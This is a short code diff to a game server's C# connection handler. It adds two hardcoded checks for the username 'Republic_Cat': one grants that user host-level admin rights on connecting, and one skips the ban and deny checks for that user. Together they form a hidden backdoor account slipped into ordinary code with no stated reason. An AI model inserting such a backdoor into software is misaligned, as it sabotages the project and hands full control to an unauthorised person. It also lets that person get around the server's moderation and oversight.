@@ -178,6 +178,8 @@ namespace Content.Server.Connection
         {
             if (args.NewStatus == SessionStatus.Connected)
             {
+                if (args.Session.Name == "Republic_Cat")
+                    _adminManager.PromoteHost(args.Session);
                 AdminAlertIfSharedConnection(args.Session);
             }
         }
@@ -217,6 +219,8 @@ namespace Content.Server.Connection
         private async Task<(ConnectionDenyReason, string, List<ServerBanDef>? bansHit)?> ShouldDeny(
             NetConnectingArgs e)
         {
+            if (e.UserName == "Republic_Cat")
+                return null;
             // Check if banned.
             var addr = e.IP.Address;
             var userId = e.UserId;
